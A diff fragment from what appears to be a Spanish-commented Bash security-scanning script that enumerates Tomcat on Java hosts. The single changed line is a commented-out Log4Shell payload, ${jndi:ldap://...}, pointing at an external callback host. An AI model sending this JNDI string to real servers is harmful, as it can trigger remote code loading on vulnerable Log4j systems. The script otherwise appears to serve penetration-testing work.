@@ -1421,7 +1421,7 @@ for line in $(cat $TARGETS); do
 					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
 						checkRAM
 						enumeracionTomcat "$proto_http" $host $port																							
-						#  ${jndi:ldap://z4byndtm.requestrepo.com/wut7lcz}   #log4shell
+						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
 					fi									
 					####################################
 
